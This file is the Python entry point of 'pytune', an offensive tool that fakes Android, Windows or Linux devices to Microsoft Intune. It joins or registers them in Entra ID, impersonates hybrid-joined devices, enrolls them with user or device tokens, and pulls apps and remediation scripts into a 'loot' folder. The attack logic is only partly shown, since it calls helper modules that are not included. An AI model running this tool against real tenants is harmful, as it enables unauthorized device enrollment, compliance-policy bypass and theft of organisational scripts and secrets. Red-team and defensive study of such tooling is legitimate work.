import string
import random
import jwt
import json
import getpass
import argparse
import os
from device.device import Device
from device.android import Android
from device.windows import Windows
from device.linux import Linux
from utils.utils import deviceauth, prtauth, gettokens, extract_pfx
from utils.logger import Logger

version = '1.3'
banner = r'''
 ______   __  __     ______   __  __     __   __     ______    
/\  == \ /\ \_\ \   /\__  _\ /\ \/\ \   /\ "-.\ \   /\  ___\   
\ \  _-/ \ \____ \  \/_/\ \/ \ \ \_\ \  \ \ \-.  \  \ \  __\   
 \ \_\    \/\_____\    \ \_\  \ \_____\  \ \_\\"\_\  \ \_____\ 
  \/_/     \/_____/     \/_/   \/_____/   \/_/ \/_/   \/_____/ 
                                                               
''' + \
f'      Faking a device to Microsft Intune (version:{version})'

class Pytune:
    def __init__(self, logger):
        self.logger = logger
        return
    
    def load_tokenfile(self, tokenfile):
        try:
            with open(tokenfile, 'r') as f:
                    data = json.load(f)
        except:
                self.logger.error('failed to load token file')
        return data
       
    def get_password(self, password):
        if password is None:
            password = getpass.getpass("Enter your password: ")
        return password

    def new_device(self, os, device_name, username, password, refresh_token, certpfx, proxy, device_config_name=None):
        prt = None
        session_key = None
        tenant = None
        deviceid = None
        uid = None


        if device_config_name:
            print('Loading device configuration...')
            device = Device(self.logger, None, None, None, None, None, None, None, proxy)
            device.load_device_config(device_config_name)

            # Setting this to allow us to overwrite the OS when doing checkins
            if (os == None):
                os = device.os
            if (device_name == None):
                device_name = device.device_name

            deviceid = device.deviceid
            uid = device.uid
            tenant = device.tenant
            prt = device.prt
            session_key = device.session_key


        elif certpfx:
            if refresh_token is None:
                password = self.get_password(password)
            
            # Authenticate using the device authentication and return the PRT and session key
            prt, session_key = deviceauth(username, password, refresh_token, certpfx, proxy)

            # Authenticate using the PRT to get the access token and decode the claims
            access_token, refresh_token = prtauth(prt, session_key, '29d9ed98-a469-4536-ade2-f981bc1d605e', 'https://enrollment.manage.microsoft.com/', 'ms-appx-web://Microsoft.AAD.BrokerPlugin/DRS', proxy)
            claims = jwt.decode(access_token, options={"verify_signature":False}, algorithms=['RS256'])
            tenant = claims['upn'].split('@')[1]
            deviceid = claims['deviceid']
            uid = claims['oid']

        os = os.lower()

        if os == 'android':
            device = Android(self.logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy)
        elif os == 'windows':
            device = Windows(self.logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy)
        elif os == 'linux':
            device = Linux(self.logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy)

        # My dumb reason for this is simple, when we init the device object later on, the attributes for device are called from the OS's class and not Devices class. 
        if (device_config_name):
            device.load_device_config(device_config_name)

        return device

    def entra_join(self, username, password, access_token, tokenfile, device_name, os, deviceticket, proxy, register: bool=False):
        device = self.new_device(os, device_name, None, None, None, None, proxy)

        # Modify the join type between register and join
        if register:
            join_type = 'register'
        else:
            join_type = 'join'

        if tokenfile:
            access_token = self.load_tokenfile(tokenfile).get('accessToken')

        if access_token is None:
            password = self.get_password(password)

        result = device.entra_join(username, password, access_token, deviceticket, join_type)
        return result

    def entra_delete(self, certpfx, proxy):
        device = Device(self.logger, None, None, None, None, None, None, None, proxy)
        device.entra_delete(certpfx)
        return

    def enroll_intune(self, os, device_name, username, password, refresh_token, tokenfile, certpfx, proxy, is_device, is_hybrid):
        if tokenfile:
            refresh_token = self.load_tokenfile(tokenfile).get('refreshToken')

        device = self.new_device(os, device_name, username, password, refresh_token, certpfx, proxy)

        if not certpfx:
            if not username or not password:
                self.logger.error('username and passwords are required')
                return False
            _, refresh_token = gettokens(username, password, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'https://graph.microsoft.com/', proxy)

        result = device.enroll_intune(certpfx, refresh_token, is_device, is_hybrid)
        return result

    def checkin(self, os, device_name, username, password, refresh_token, tokenfile, certpfx, mdmpfx, hwhash, proxy, stdout=False, write_output_to_dir=False, device_config=None):
        if tokenfile:
            refresh_token = self.load_tokenfile(tokenfile).get('refreshToken')

        device = self.new_device(os, device_name, username, password, refresh_token, certpfx, proxy, device_config)
        device.hwhash = hwhash
        device.checkin(mdmpfx, stdout, write_output_to_dir)

    def retire_intune(self, os, username, password, refresh_token, tokenfile, certpfx, proxy):
        if tokenfile:
            refresh_token = self.load_tokenfile(tokenfile).get('refreshToken')

        device = self.new_device(os, None, username, password, refresh_token, certpfx, proxy)
        device.retire_intune()
        return

    def download_apps(self, device_name, mdmpfx, proxy, device_config=None):
        device = self.new_device('Windows', device_name, None, None, None, None, proxy, device_config)
        device.download_apps(mdmpfx)

    def download_remediation_scripts(self, device_name, mdmpfx, proxy, device_config=None):
        device = self.new_device('Windows', device_name, None, None, None, None, proxy, device_config)
        device.download_remediation_scripts(mdmpfx)

    def attempt_auto_create(self, username, password, access_token, tokenfile, device_name, os, deviceticket, proxy, stdout=True, write_output_to_dir=False):
        device_pfx_path = f'{device_name}.pfx'
        device_mdm_pfx_path = f'{device_name}_mdm.pfx'

        # Attempt to use the entra_join method to join the device, if that fails, try to register the device instead
        valid = self.entra_join(username, password, access_token, tokenfile, device_name, os, deviceticket, proxy, register=False)
        if not valid:
            self.logger.info('Failed to Join, attempting to register the device instead...')
            valid = self.entra_join(username, password, access_token, tokenfile, device_name, os, deviceticket, proxy, register=True)
            if not valid:
                self.logger.error('Both join and register attempts failed.')
                return False

        # Once a device is successfully joined or registered, proceed to enroll it in Intune
        valid = self.enroll_intune(os, device_name, username, password, None, tokenfile, device_pfx_path, proxy, is_device=False, is_hybrid=False)
        if not valid:
            # If enrollment fails for default, change to device token enrollment
            self.logger.info('Standard enrollment failed, attempting to enroll via Hybrid Mode...')
            valid = self.enroll_intune(os, device_name, username, password, None, tokenfile, device_pfx_path, proxy, is_device=False, is_hybrid=True)
            if not valid:
                self.logger.info('Enrollment with hybrid failed, attempting to enroll via device token...')
                valid = self.enroll_intune(os, device_name, username, password, None, tokenfile, device_pfx_path, proxy, is_device=True, is_hybrid=False)
                if not valid:
                    valid = self.enroll_intune(os, device_name, username, password, None, tokenfile, device_pfx_path, proxy, is_device=True, is_hybrid=True)
                    if not valid:
                        self.logger.error('Both enrollment attempts failed.')
                        return False
        
        # If you are enrolled, trigger a checkin
        self.logger.info('Device successfully enrolled, attempting to checkin...')
        # I have not included the hwhash here, but if we wanted hybrid joined autopilot devices, we would need to add that in
        self.checkin(os, device_name, username, password, None, tokenfile, device_pfx_path, device_mdm_pfx_path, None, proxy, stdout, write_output_to_dir)

        # Once we have checked in, we can do a compliance check
        self.logger.info('Attempting to check compliance status...')
        self.return_device_information(username, password, None, tokenfile, device_pfx_path, proxy)

        return True

    def get_device_info(self, username, password, refresh_token, tokenfile, certpfx, proxy, device_name, device_config=None):
        if tokenfile:
            refresh_token = self.load_tokenfile(tokenfile).get('refreshToken')

        device = self.new_device('Windows', device_name, username, password, refresh_token, certpfx, proxy, device_config)
        device.return_device_information()


def main():
    description = f"{banner}"
    parser = argparse.ArgumentParser(add_help=True, description=f'\033[34m{description}\033[0m', formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument('-x', '--proxy', action='store', help='proxy to be used during authentication (format: http://proxyip:port)')
    parser.add_argument('-v', '--verbose', action='store_true', help='show information for debugging')

    subparsers = parser.add_subparsers(dest='command', description='pytune commands')
    
    entra_join_parser = subparsers.add_parser('entra_join', help='join device to Entra ID')
    entra_join_parser.add_argument('-u', '--username', action='store', help='username')
    entra_join_parser.add_argument('-p', '--password', action='store', help='password')
    entra_join_parser.add_argument('-a', '--access_token', action='store', help='access token for device registration service')
    entra_join_parser.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    entra_join_parser.add_argument('-d', '--device_name', required=False, action='store', help='device name (optional: generates random desktop-****** otherwise)', default=None)
    entra_join_parser.add_argument('-o', '--os', required=True, action='store', help='os')
    entra_join_parser.add_argument('-D', '--deviceticket', required=False, action='store', help='device ticket')
    entra_join_parser.add_argument('--register', action='store_true', help='register device instead of join')

    entra_delete_parser = subparsers.add_parser('entra_delete', help='delete device from Entra ID')
    entra_delete_parser.add_argument('-c', '--certpfx', required=True, action='store', help='device cert pfx path')

    enroll_intune_parser = subparsers.add_parser('enroll_intune', help='enroll device to Intune')
    enroll_intune_parser.add_argument('-u', '--username', action='store', help='username')
    enroll_intune_parser.add_argument('-p', '--password', action='store', help='password')
    enroll_intune_parser.add_argument('-r', '--refresh_token', action='store', help='refresh token for device registration service')
    enroll_intune_parser.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    enroll_intune_parser.add_argument('-c', '--certpfx', required=False, action='store', help='device cert pfx path')
    enroll_intune_parser.add_argument('-d', '--device_name', required=True, action='store', help='device name')
    enroll_intune_parser.add_argument('-o', '--os', required=True, action='store', help='os')
    enroll_intune_parser.add_argument('--device_token', action='store_true', help='use device token for enrollment')
    enroll_intune_parser.add_argument('--hybrid', action='store_true', help='impersonate Entra hybrid joined device')

    checkin_parser = subparsers.add_parser('checkin', help='checkin to Intune')
    checkin_parser.add_argument('-u', '--username', action='store', help='username')
    checkin_parser.add_argument('-p', '--password', action='store', help='password')
    checkin_parser.add_argument('-r', '--refresh_token', action='store', help='refresh token for device registration service')
    checkin_parser.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    checkin_parser.add_argument('-c', '--certpfx', required=False, action='store', help='device cert pfx path')
    checkin_parser.add_argument('-m', '--mdmpfx', required=False, action='store', help='mdm pfx path')
    checkin_parser.add_argument('-d', '--device_name', required=False, action='store', help='device name')
    checkin_parser.add_argument('-o', '--os', required=False, action='store', help='os')
    checkin_parser.add_argument('-H', '--hwhash', required=False, action='store', help='Autopilot hardware hash')
    checkin_parser.add_argument('-s', '--stdout', required=False, action='store_true', help='write output of checkin to console', default=False)
    checkin_parser.add_argument('--dirout', required=False, action='store_true', help='write output of checkin to loot folder', default=False)
    checkin_parser.add_argument('-dc', '--device_config', action='store', help='Device Name used for configuration file')

    retire_intune_parser = subparsers.add_parser('retire_intune', help='retire device from Intune')
    retire_intune_parser.add_argument('-u', '--username', action='store', help='username')
    retire_intune_parser.add_argument('-p', '--password', action='store', help='password')
    retire_intune_parser.add_argument('-r', '--refresh_token', action='store', help='refresh token for device registration service')
    retire_intune_parser.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    retire_intune_parser.add_argument('-c', '--certpfx', required=True, action='store', help='device cert pfx path')
    retire_intune_parser.add_argument('-o', '--os', required=True, action='store', help='os')

    download_apps_intune_parser = subparsers.add_parser('download_apps', help='download available win32apps and scripts (only Windows supported since I\'m lazy)')
    download_apps_intune_parser.add_argument('-m', '--mdmpfx', required=False, action='store', help='mdm pfx path')
    download_apps_intune_parser.add_argument('-d', '--device_name', required=False, action='store', help='device name')
    download_apps_intune_parser.add_argument('-dc', '--device_config', action='store', help='Device Name used for configuration file')

    download_apps_intune_parser = subparsers.add_parser('get_remediations', help='download available remediation scripts (only Windows supported since I\'m lazy)')
    download_apps_intune_parser.add_argument('-m', '--mdmpfx', required=False, action='store', help='mdm pfx path')
    download_apps_intune_parser.add_argument('-d', '--device_name', required=False, action='store', help='device name')
    download_apps_intune_parser.add_argument('-dc', '--device_config', action='store', help='Device Name used for configuration file')

    auto_create_parser = subparsers.add_parser('auto_create', help='Automatically create, enroll, checkin, and return compliance of a device')
    auto_create_parser.add_argument('-u', '--username', action='store', help='username')
    auto_create_parser.add_argument('-p', '--password', action='store', help='password')
    auto_create_parser.add_argument('-a', '--access_token', action='store', help='access token for device registration service')
    auto_create_parser.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    auto_create_parser.add_argument('-d', '--device_name', required=False, action='store', help='device name (optional: generates random desktop-****** otherwise)', default=None)
    auto_create_parser.add_argument('-o', '--os', required=True, action='store', help='os')
    auto_create_parser.add_argument('-D', '--deviceticket', required=False, action='store', help='device ticket')
    auto_create_parser.add_argument('-s', '--stdout', required=False, action='store_true', help='write output of checkin to console', default=False)
    auto_create_parser.add_argument('--dirout', required=False, action='store_true', help='write output of checkin to loot folder', default=False)

    get_device_info = subparsers.add_parser('get_info', help='Get Device Info')
    get_device_info.add_argument('-u', '--username', action='store', help='username')
    get_device_info.add_argument('-p', '--password', action='store', help='password')
    get_device_info.add_argument('-r', '--refresh_token', action='store', help='refresh token for device registration service')
    get_device_info.add_argument('-d', '--device_name', action='store', help='device name')
    get_device_info.add_argument('-f', '--tokenfile', action='store', help='token file from roadtx (ex. .roadtools_auth)')
    get_device_info.add_argument('-c', '--certpfx', action='store', help='device cert pfx path')
    get_device_info.add_argument('-dc', '--device_config', action='store', help='Device Name used for configuration file')

    show_configs = subparsers.add_parser('show_configs', help='Show Device Configurations')

    args = parser.parse_args()
    
    proxy=None
    if args.proxy:
        proxy={
            'https':args.proxy,
            'http':args.proxy
            }

    logger = Logger(args.verbose)
    pytune = Pytune(logger)

    if (args.command == 'entra_join' or args.command == 'auto_create') :
        if args.device_name is None:
            args.device_name = 'DESKTOP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

    if (args.command == 'entra_delete' or args.command == 'enroll_intune' or args.command == 'checkin' or args.command == 'retire_intune' or args.command == 'get_info'):
        if (args.certpfx):
            certpath = args.certpfx
            if (certpath.rfind('.pfx') == -1):
                certpath += '.pfx'
            if not os.path.isfile(certpath):
                logger.error(f'Certificate PFX file not found: {certpath}')
                return False
            else:
                args.certpfx = certpath

    if (args.command == 'entra_join' or args.command == 'auto_create' or args.command == 'enroll_intune' or args.command == 'checkin' or args.command == 'retire_intune' or args.command == 'get_info'):
        if (args.tokenfile):
            tokenpath = args.tokenfile
            if not os.path.isfile(tokenpath):
                logger.error(f'Token file not found: {tokenpath}')
                return False
            else:
                args.tokenfile = tokenpath
    
    if args.command == 'entra_join':
        pytune.entra_join(args.username, args.password, args.access_token, args.tokenfile, args.device_name, args.os, args.deviceticket, proxy, args.register)
    if args.command == 'entra_delete':
        pytune.entra_delete(args.certpfx, proxy)
    if args.command == 'enroll_intune':
        pytune.enroll_intune(args.os, args.device_name, args.username, args.password, args.refresh_token, args.tokenfile, args.certpfx, proxy, args.device_token, args.hybrid)
    if args.command == 'checkin':
        pytune.checkin(args.os, args.device_name, args.username, args.password, args.refresh_token, args.tokenfile, args.certpfx, args.mdmpfx, args.hwhash, proxy, args.stdout, args.dirout, args.device_config)
    if args.command == 'retire_intune':
        pytune.retire_intune(args.os, args.username, args.password, args.refresh_token, args.tokenfile, args.certpfx, proxy)
    if args.command == 'download_apps':
        pytune.download_apps(args.device_name, args.mdmpfx, proxy, args.device_config)
    if args.command == 'get_remediations':
        pytune.download_remediation_scripts(args.device_name, args.mdmpfx, proxy, args.device_config)
    if args.command == 'auto_create':
        pytune.attempt_auto_create(args.username, args.password, args.access_token, args.tokenfile, args.device_name, args.os, args.deviceticket, proxy, args.stdout, args.dirout)
    if args.command == 'get_info':
        pytune.get_device_info(args.username, args.password, args.refresh_token, args.tokenfile, args.certpfx, proxy, args.device_name, args.device_config)

    if args.command == 'show_configs':
        device = Device(logger, None, None, None, None, None, None, None, proxy)
        device.display_device_configs()

if __name__ == "__main__":
    main()

